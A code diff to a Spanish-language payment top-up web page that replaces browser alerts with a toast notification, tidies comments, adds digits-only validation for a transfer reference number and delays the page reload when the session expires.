-            alert("Por favor confirme que entiende el proceso marcando la casilla correspondiente.");
+            showToast("Por favor confirme que entiende el proceso marcando la casilla correspondiente.");
             return;
         }
         
@@ -3329,10 +3371,10 @@
         // Crear líneas de interferencia adicionales en posiciones aleatorias
         createInterferenceLines();
         
-        // NUEVO: Marcar que el usuario ha visto los datos de pago
+        // Marcar que el usuario ha visto los datos de pago
         hasViewedPaymentData = true;
         
-        // NUEVO: Mostrar el checkbox de confirmación de transferencia
+        // Mostrar el checkbox de confirmación de transferencia
         document.getElementById('transfer-confirmation').classList.add('visible');
     }
     
@@ -3347,6 +3389,39 @@
         if (hasViewedPaymentData) {
             document.getElementById('transfer-confirmation').classList.add('visible');
         }
+    }
+    
+    // Función para mostrar notificaciones tipo toast
+    function showToast(message) {
+        // Crear el elemento toast si no existe
+        let toast = document.getElementById('toast-notification');
+        if (!toast) {
+            toast = document.createElement('div');
+            toast.id = 'toast-notification';
+            toast.style.position = 'fixed';
+            toast.style.bottom = '20px';
+            toast.style.left = '50%';
+            toast.style.transform = 'translateX(-50%)';
+            toast.style.backgroundColor = 'rgba(26, 31, 113, 0.9)';
+            toast.style.color = 'white';
+            toast.style.padding = '10px 20px';
+            toast.style.borderRadius = '10px';
+            toast.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.2)';
+            toast.style.zIndex = '9999';
+            toast.style.transition = 'all 0.3s ease';
+            toast.style.opacity = '0';
+            toast.setAttribute('role', 'alert'); // Para mejor accesibilidad
+            document.body.appendChild(toast);
+        }
+        
+        // Actualizar mensaje y mostrar
+        toast.textContent = message;
+        toast.style.opacity = '1';
+        
+        // Ocultar después de 3 segundos
+        setTimeout(() => {
+            toast.style.opacity = '0';
+        }, 3000);
     }
     
     // Función para copiar al portapapeles
@@ -3367,7 +3442,7 @@
             }, 2000);
         }).catch(function(err) {
             console.error('Error al copiar: ', err);
-            alert('No se pudo copiar al portapapeles. Por favor, inténtalo manualmente.');
+            showToast('No se pudo copiar al portapapeles. Por favor, inténtalo manualmente.');
         });
     }
     
@@ -3411,21 +3486,21 @@
         })
         .catch(function(error) {
             console.error('Error al copiar al portapapeles:', error);
-            alert('No se pudo copiar el texto. Por favor, inténtelo de nuevo.');
+            showToast('No se pudo copiar el texto. Por favor, inténtelo de nuevo.');
         });
     }
     
     // Ir al formulario de detalles de transferencia
     function goToTransferDetails() {
-        // NUEVA VALIDACIÓN: comprobar si el usuario ha visto los datos de pago
+        // Validar que se haya visto los datos de pago
         if (!hasViewedPaymentData) {
-            alert("Para continuar, primero debe revisar los datos para realizar la transferencia. Haga clic en 'Ver Datos para Recarga'.");
+            showToast("Para continuar, primero debe revisar los datos para realizar la transferencia. Haga clic en 'Ver Datos para Recarga'.");
             return;
         }
         
         // Validar que se haya confirmado la transferencia
         if (!transferConfirmed) {
-            alert("Por favor confirme que ha realizado la transferencia marcando la casilla de verificación.");
+            showToast("Por favor confirme que ha realizado la transferencia marcando la casilla de verificación.");
             return;
         }
         
@@ -3482,8 +3557,10 @@
                 clearInterval(sessionTimer);
                 
                 // Cierre de sesión
-                alert('Su sesión ha expirado por seguridad. El sistema cerrará automáticamente.');
-                location.reload();
+                showToast('Su sesión ha expirado por seguridad. El sistema cerrará automáticamente.');
+                setTimeout(() => {
+                    location.reload();
+                }, 2000);
             }
         }, 1000);
     }
@@ -3513,6 +3590,9 @@
         // Validar referencia
         if (!reference) {
             document.getElementById('reference-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese el número de referencia';
+            isValid = false;
+        } else if (!/^\d+$/.test(reference)) {
+            document.getElementById('reference-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> El número de referencia debe contener solo dígitos';
             isValid = false;
         } else {
             document.getElementById('reference-error').textContent = '';
@@ -3629,7 +3709,6 @@
             // Actualizar la barra de progreso
             document.getElementById('progress-steps').setAttribute('data-progress', '2');
         }
-        // Se ha eliminado la opción de volver en la etapa final (transfer-details-form)
     }
     
     // Cerrar overlay al hacer clic fuera
@@ -3652,3 +3731,5 @@
         s0.parentNode.insertBefore(s1,s0);
     })();
 </script>
+</body>
+</html>
